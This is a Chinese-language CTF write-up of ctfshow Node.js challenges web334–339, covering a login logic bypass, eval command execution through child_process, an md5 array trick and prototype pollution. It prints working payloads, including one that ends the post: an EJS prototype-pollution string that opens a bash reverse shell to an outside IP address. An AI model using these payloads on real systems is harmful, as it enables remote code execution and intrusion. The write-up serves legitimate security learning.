## 写在前面

开始nodejs系列

之前一直不太清楚什么是nodejs，觉得是一种新的语言，官方解释如下

>简单的说 Node.js 就是运行在服务端的 JavaScript。
>
>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。
>
>Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。

——KonDream 2022年2月16日14:47:48

## web334

题目打开后是个登录界面，附件给出了源码

```js
// user.js
module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};
```

```js
// login.js
var express = require('express');
var router = express.Router();
var users = require('../modules/user').items;
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};

/* GET home page. */
router.post('/', function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;
```

重点就在第8行

```js
return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
```

要使其返回true，那么就很明显，用户名为ctfshow，密码为123456，登录即可拿到flag

## web335(同步执行)

提示一个eval，应该是命令执行，但是在nodejs中如何执行系统命令呢

在熟悉的php中，执行系统命令需要system函数，而在nodejs中，需要引用`child_process`模块

>Nodejs基于事件驱动来处理并发，本身是单线程模式运行的。Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。主要包括4个异步进程函数(spawn,exec,execFile,fork)和3个同步进程函数(spawnSync,execFileSync,execSync)。以异步函数中spawn是最基本的创建子进程的函数，其他三个异步函数都是对spawn不同程度的封装。spawn只能运行指定的程序，参数需要在列表中给出，而exec可以直接运行复杂的命令。

payload：**?eval=require('child_process').execSync('tac fl00g.txt')**

或者 **?eval=require('child_process').spawnSync('tac',['fl00g.txt']).stdout.toString()**

这里我去了解了一下同步和异步的区别

![image-20220216161328877](image/ctfshow-nodejs(334-344)/image-20220216161328877.png)

exec同步执行下返回一个buffer，并通过返回的buffer去识别完成状态

![image-20220216161551112](image/ctfshow-nodejs(334-344)/image-20220216161551112.png)

spawn方法异步衍生子进程，不会阻塞 Node.js 事件循环。 spawnSync()函数以同步方式提供等效的功能，其会阻塞事件循环，直到衍生的进程退出或终止

看看官方说法

>为方便起见，`child_process` 模块提供了一些同步和异步方法替代 [`child_process.spawn()`](http://nodejs.cn/api/child_process.html#child_processspawncommand-args-options) 和 [`child_process.spawnSync()`](http://nodejs.cn/api/child_process.html#child_processspawnsynccommand-args-options)。 这些替代方法中的每一个都是基于 [`child_process.spawn()`](http://nodejs.cn/api/child_process.html#child_processspawncommand-args-options) 或 [`child_process.spawnSync()`](http://nodejs.cn/api/child_process.html#child_processspawnsynccommand-args-options) 实现。
>
>- [`child_process.exec()`](http://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback): 衍生 shell 并在该 shell 中运行命令，完成后将 `stdout` 和 `stderr` 传给回调函数。
>- [`child_process.execFile()`](http://nodejs.cn/api/child_process.html#child_processexecfilefile-args-options-callback): 与 [`child_process.exec()`](http://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback) 类似，不同之处在于，默认情况下，它直接衍生命令，而不先衍生 shell。
>- [`child_process.fork()`](http://nodejs.cn/api/child_process.html#child_processforkmodulepath-args-options): 衍生新的 Node.js 进程并使用建立的 IPC 通信通道（其允许在父子进程之间发送消息）调用指定的模块。
>- [`child_process.execSync()`](http://nodejs.cn/api/child_process.html#child_processexecsynccommand-options): [`child_process.exec()`](http://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback) 的同步版本，其将阻塞 Node.js 事件循环。
>- [`child_process.execFileSync()`](http://nodejs.cn/api/child_process.html#child_processexecfilesyncfile-args-options): [`child_process.execFile()`](http://nodejs.cn/api/child_process.html#child_processexecfilefile-args-options-callback) 的同步版本，其将阻塞 Node.js 事件循环。
>
>对于某些情况，例如自动化 shell 脚本，[同步的方法](http://nodejs.cn/api/child_process.html#synchronous-process-creation)可能更方便。 但是，在许多情况下，由于在衍生的进程完成前会停止事件循环，同步方法会对性能产生重大影响。

所以这里采用同步执行的原因是为了看到结果，阻塞事件，采用异步的话就没那么直观了

![image-20220216165446553](image/ctfshow-nodejs(334-344)/image-20220216165446553.png)

从结果中也可以很明显看到同步的执行结果，对于stdout执行16进制转asii即可(toString)

## web336

在上一题的基础上过滤了exec

payload：**?eval=require('child_process').spawnSync('cat', ['fl001g.txt']).stdout.toString()**

## web337

nodejs的md5

payload：**?a[]=1&b[]=1**

举个例子：

```js
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}
var a = [1]; //{'0':'1'}
var b = [1];
var flag='xxxxxxx';

console.log(a!==b);	// true

  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	console.log('yes');
  }else{
  	console.log('no');
  }
```

最后执行结果是yes，可能会疑问不是限制了a≠b吗，我理解是这里比较的是对象，下个md5又取的是值，所以满足了判断，后面有个大赛原题和这个类似。

## web338(原型链污染)

```js
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');

/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
  
});

module.exports = router;
```

关键代码在第13行，可是我们发现secert对象并没有ctfshow这个属性，默认是返回null的，那么想要满足判断就要利用原型链污染：prototype

payload：**``{"__proto__":{"ctfshow":"36dboy"}}``**

![image-20220216180533931](image/ctfshow-nodejs(334-344)/image-20220216180533931.png)

简单来说，`__proto__`指向的是实例的`prototype`。那么，如果我修改了`__proto__`中的值，就可以修改任意Object类的实例。

那就意味着如果攻击者控制并修改了一个对象的原型，那么就会影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是**原型链污染**。

详细说明推荐p神文章：[深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)

## web339

![image-20220217000107791](image/ctfshow-nodejs(334-344)/image-20220217000107791.png)

![image-20220217000003236](image/ctfshow-nodejs(334-344)/image-20220217000003236.png)



``{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/42.193.107.62/9999 0>&1\"');var __tmp2"}}``



